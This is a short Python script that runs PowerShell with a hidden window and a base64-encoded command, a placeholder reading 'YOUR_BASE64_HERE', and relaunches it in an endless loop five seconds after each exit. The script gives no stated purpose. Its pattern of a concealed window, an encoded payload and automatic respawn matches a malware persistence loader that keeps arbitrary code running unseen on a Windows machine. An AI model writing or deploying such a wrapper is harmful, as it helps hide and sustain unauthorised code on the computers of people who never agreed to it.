import subprocess
import time

cmd = ["powershell", "-WindowStyle", "Hidden", "-EncodedCommand", "YOUR_BASE64_HERE"]

while True:
    p = subprocess.Popen(
        cmd,
        creationflags=subprocess.CREATE_NO_WINDOW
    )

    p.wait()        # wait until it stops
    time.sleep(5)   # restart delay
